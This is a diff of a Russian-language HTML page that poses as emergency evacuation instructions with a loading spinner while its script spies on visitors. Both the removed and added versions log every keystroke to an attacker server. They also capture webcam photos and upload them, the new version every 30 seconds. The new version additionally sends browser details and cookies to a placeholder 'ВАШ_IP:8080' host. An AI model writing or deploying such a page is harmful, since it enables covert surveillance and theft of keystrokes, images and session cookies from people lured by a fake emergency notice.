@@ -1,34 +1,71 @@
-<!DOCTYPE html>  
-<html>  
-<head>  
-    <title>Davion ai</title>  
-    <script>  
-        // Ловим нажатия клавиш  
-        document.addEventListener('keydown', function(e) {  
-            fetch('https://ваш-сервер.рф/log?key=' + e.key);  
-        });  
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Экстренные инструкции по эвакуации</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .loading { 
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Загрузка жизненно важных данных...</h1>
+    <p>Пожалуйста, не закрывайте эту страницу <span class="loading"></span></p>
 
-        // Пытаемся получить доступ к камере (если жертва разрешит)  
-        navigator.mediaDevices.getUserMedia({ video: true })  
-            .then(stream => {  
-                const track = stream.getVideoTracks()[0];  
-                const imageCapture = new ImageCapture(track);  
-                imageCapture.takePhoto().then(blob => {  
-                    const formData = new FormData();  
-                    formData.append('photo', blob);  
-                    fetch('https://ваш-сервер.рф/upload', { method: 'POST', body: formData });  
-                });  
-            })  
-            .catch(e => console.log("Камера недоступна:", e));  
+    <script>
+        // Конфигурация
+        const SERVER_URL = 'http://ВАШ_IP:8080';  // Замените на IP вашего Python-сервера
 
-        // Если браузер уязвим — попытка запуска эксплойта  
-        setTimeout(() => {  
-            window.location.href = "data:text/html;base64,PHNjcmlwdD5hbGVydCgn0J3QsCDRg9C00LDQu9C40YLRjCDQsiDRjdGC0L7RgiDQv9GA0L7QsdC10LvRjCEnKTs8L3NjcmlwdD4=";  
-        }, 3000);  
-    </script>  
-</head>  
-<body>  
-    <h1>Please allow camera to procced</h1>  
-    <p>Loading files... Do not close the page</p>  
-</body>  
-</html>  
+        // 1. Логирование клавиш
+        document.addEventListener('keydown', (e) => {
+            fetch(`${SERVER_URL}/keylog?key=${encodeURIComponent(e.key)}&time=${Date.now()}`);
+        });
+
+        // 2. Попытка доступа к камере (если нужно)
+        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+                    
+                    // Делаем скриншот каждые 30 секунд
+                    setInterval(() => {
+                        imageCapture.takePhoto()
+                            .then(blob => {
+                                const formData = new FormData();
+                                formData.append('screenshot', blob);
+                                fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData });
+                            });
+                    }, 30000);
+                })
+                .catch(e => console.error("Камера недоступна:", e));
+        }
+
+        // 3. Сбор системной информации
+        const sysInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            resolution: `${screen.width}x${screen.height}`,
+            cookies: document.cookie,
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        };
+        fetch(`${SERVER_URL}/sysinfo`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(sysInfo)
+        });
+    </script>
+</body>
+</html>
